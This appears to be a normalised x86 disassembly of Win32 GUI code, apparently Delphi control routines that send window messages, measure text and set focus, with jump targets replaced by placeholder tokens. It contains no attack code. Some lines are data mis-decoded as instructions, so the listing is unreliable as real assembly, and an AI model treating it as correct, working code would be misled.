cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_434edd
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_441af0
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_441af0
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_434f50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_434f8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441920
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434f96
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_434f96
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_434b88
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_435010
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SendMessageA
sub_435010
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_43504c
pop ebx
retn
sub_43504c
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41c73c
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_43d92c
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_435118
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_4424e0
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_435150
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_444968
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_444968
push eax
call SendMessageA
sub_435190
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443f80
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_435010
mov eax ebx
call sub_441f08
sub_4351c4
push ebx
mov ebx eax
mov eax ebx
call sub_443ec4
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43504c
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_43520c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443d1c
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_444968
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_434cd0
sub_435248
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_444c6c
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_40348c
push 0xfffffff0
mov eax esi
call sub_444968
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_435280
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_445a68
pop esi
pop ebx
retn
sub_43529c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440660
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_4352c0
push ebx
mov ebx eax
mov eax ebx
call sub_44a794
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4352f8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_43534e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_43535c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440694
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4353b0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_445438
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_435404
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_435428
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44237c
mov eax ebx
mov si 0xffb5
call sub_40348c
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_444968
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_40348c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4354a0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4301bc
mov ebx eax
mov eax ebx
call sub_43029c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_444968
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_430434
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4354ec
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4301bc
call sub_43029c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_442dbc
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_435518
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4417f4
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_435550
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43535c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43d908
mov edx 0x19
mov eax esi
call sub_43d92c
mov dl 0x1
mov eax esi
call sub_444b9c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_4355dc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_444c6c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_444968
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_444968
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_435630
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_444c6c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4553f0
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_43f334
sub_435664
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_435518
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_441720
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4356cc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_443de4
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4552f8
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40348c
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_435739
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4357b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43e14c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455380
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443dec
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40348c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4357b9
sub_4357c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_443df4
pop edi
pop esi
pop ebx
retn
sub_435814
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4301bc
call sub_43029c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_435840
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4301bc
mov ebx eax
mov eax ebx
call sub_43029c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_444968
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_430434
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43588c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43535c
mov edx 0x71
mov eax esi
call sub_43d908
mov edx 0x11
mov eax esi
call sub_43d92c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_4358f4
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_435934
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44165c
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44aa28
sub_4359f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444b9c
mov eax [ ebp - 0x4 ]
call sub_444c6c
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SendMessageA
push ebp
call sub_435934
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43dd58
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40348c
sub_435a7c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_435518
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_441720
mov eax ebx
mov si 0xffc8
call sub_40348c
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_435ad3
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x41bd173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_435b08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_435b7d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43e14c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455380
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443dec
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435b84
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_435b8c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_40348c
jmp r-xdata
pop esi
retn
sub_435bd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_435c9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_444968
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_43783c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40462c
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_414658
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435ca3
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4044a0
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_444968
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40462c
sub_435cac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_435d2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_40348c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43785c
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435d36
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_414658
sub_435d40
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_40348c
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_40348c
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_40348c
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_435dc0
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_40348c
sub_435de8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_435e75
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e7c
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
push 0x0
push 0x180
mov eax edi
call sub_444968
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
sub_435e88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_435f11
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f18
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
push edi
push 0x181
mov eax esi
call sub_444968
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
sub_435f30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436080
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436087
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404004
retn
mov eax [ ebp - 0x4 ]
call sub_4144dc
xor eax eax
push ebp
push sub_43605e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_40348c
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_40348c
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_40348c
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_40348c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414598
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_4360a0
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_444968
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_43e688
sub_4360d4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_4044a0
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_444968
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_437884
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_436118
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436217
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43621e
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
call sub_4144dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_4361fa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_414598
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_40348c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_40348c
mov edx ebx
mov eax [ ebp - 0x4 ]
